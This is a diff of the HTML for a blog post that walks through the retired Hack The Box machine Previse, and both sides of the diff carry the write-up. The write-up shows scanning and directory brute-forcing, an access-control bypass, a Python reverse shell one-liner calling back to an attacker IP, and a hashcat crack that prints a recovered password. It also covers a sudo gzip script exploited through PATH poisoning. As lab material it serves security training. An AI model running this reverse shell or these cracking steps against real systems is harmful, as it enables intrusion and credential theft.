@@ -21,12 +21,11 @@
   <meta name="twitter:title" content="Previse Hackthebox writeup">
   <meta name="twitter:description" content="In this Writeup you will find walkthrough of the retired machine previse From Hackthebox">
       <meta name="twitter:site" content="@tinkerhell1337">
-<meta name="application-name" content="0xMesbaha">
-<meta name="apple-mobile-web-app-title" content="0xMesbaha">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/windows-machines/2022-01-07-alfred/" /><link rel="next" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-forge/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/windows-machines/2022-01-07-alfred/" /><link rel="next" href="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-forge/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -45,18 +44,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -120,7 +108,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Previse Hackthebox writeup</h1><div class="post-meta">
-            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/">Linux Machines</a></span></div>
+            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-27">2022-01-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;567 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -152,21 +140,11 @@
 <p>export IP=10.10.11.104</p></blockquote>
 <h1 id="scanning-">scanning :</h1>
 <h2 id="intial">intial</h2>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -vv <span class="nv">$IP</span> -oN nmap/intial</span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -vv <span class="nv">$IP</span> -oN nmap/intial
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
 </span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span></span></span></code></pre></div></div>
-<p>visiting the web page :</p>
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span></code></pre></div><p>visiting the web page :</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -177,30 +155,15 @@
         title="image" /></p>
 <p>tried some sqli but not worked</p>
 <h2 id="directory-brute-force-">directory brute-force :</h2>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt</span></span></code></pre></div></div>
-<p>found :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/accounts.php         <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 3994<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt
+</span></span></code></pre></div><p>found :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/accounts.php         <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 3994<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/download.php         <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/files.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 4914<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span></span></span></code></pre></div></div>
-<p>you can use curl without enabling redirect and will notice the same thing immediately</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.11.104/accounts.php -vvv</span></span></code></pre></div></div>
-<p>But i opened up my burpsuite and observe the requests and response for /accounts.php</p>
+</span></span><span class="line"><span class="cl">/files.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 4914<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
+</span></span></code></pre></div><p>you can use curl without enabling redirect and will notice the same thing immediately</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.11.104/accounts.php -vvv
+</span></span></code></pre></div><p>But i opened up my burpsuite and observe the requests and response for /accounts.php</p>
 <ul>
 <li>there is a redirect happen to /login.php again .</li>
 <li>i do intercept the redirect and found :</li>
@@ -260,12 +223,7 @@ HTTP 302 redirect to HTTP 200 OK</p>
         alt="/assets/images/Previse/20211002034310.png"
         title="image" /></p>
 <p>in config.php :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-php">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">connectDB</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
@@ -277,8 +235,7 @@ HTTP 302 redirect to HTTP 200 OK</p>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div></div>
-<p>after some navigating in the files :
+</span></span></span></code></pre></div><p>after some navigating in the files :
 in /logs.php</p>
 <p><img
         class="lazyload"
@@ -309,13 +266,8 @@ in /logs.php</p>
 <li>we can get a shell immediatley</li>
 </ul>
 <p>[+] from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python" target="_blank" rel="noopener noreffer ">here</a></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-python">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.120&#34;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span></span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.120&#34;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Previse/20211002041602.png"
@@ -331,28 +283,13 @@ in /logs.php</p>
         data-sizes="auto"
         alt="/assets/images/Previse/20211002041508.png"
         title="image" /></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-python">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># stablizie the shell</span>
-</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span></span></span></code></pre></div></div>
-<p>hence we are in the machine now so we can access local host and view data base :D</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -h localhost -u root -p previse</span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-sql">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span></span></span></code></pre></div></div>
-<p><img
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># stablizie the shell</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><p>hence we are in the machine now so we can access local host and view data base :D</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -h localhost -u root -p previse
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Previse/20211002042525.png"
@@ -369,17 +306,12 @@ in /logs.php</p>
 <p>we can see it is a md5crypt hash</p>
 </li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hashcat -m <span class="m">500</span> -a <span class="m">0</span> hashed_m4lware /usr/share/wordlists/rockyou.txt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hashcat -m <span class="m">500</span> -a <span class="m">0</span> hashed_m4lware /usr/share/wordlists/rockyou.txt
 </span></span><span class="line"><span class="cl"><span class="c1"># 500 : md5crypt</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 0   : straight attack mode</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># output :</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$1</span>$ðŸ§‚llol<span class="nv">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!</span></span></code></pre></div></div>
-<p><img
+</span></span><span class="line"><span class="cl"><span class="nv">$1</span>$🧂llol<span class="nv">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/Previse/20211002043827.png"
@@ -397,12 +329,7 @@ in /logs.php</p>
         alt="/assets/images/Previse/20211002043918.png"
         title="image" /></p>
 <p>so let&rsquo;s read the script :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="c1"># We always make sure to store logs, we take security SERIOUSLY here</span>
 </span></span><span class="line"><span class="cl">
@@ -410,8 +337,8 @@ in /logs.php</p>
 </span></span><span class="line"><span class="cl"><span class="c1"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">gzip -c /var/log/apache2/access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&#34;yesterday&#34;</span> +%Y%b%d<span class="k">)</span>_access.gz
-</span></span><span class="line"><span class="cl">gzip -c /var/www/file_access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&#34;yesterday&#34;</span> +%Y%b%d<span class="k">)</span>_file_access.gz</span></span></code></pre></div></div>
-<ul>
+</span></span><span class="line"><span class="cl">gzip -c /var/www/file_access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&#34;yesterday&#34;</span> +%Y%b%d<span class="k">)</span>_file_access.gz
+</span></span></code></pre></div><ul>
 <li>so it simply makes a backup for the logs with gzip .</li>
 <li>we should focus on how to manipulate gzip .</li>
 </ul>
@@ -447,7 +374,7 @@ in /logs.php</p>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,RCE,path poisoning"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2flinux-machines%2f2022-01-27-previse%2f&amp;text=Previse%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,RCE,path poisoning"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hussienmisbah.github.io/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -464,17 +391,14 @@ in /logs.php</p>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://hussienmisbah.github.io/" target="_blank">0xMesbaha</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
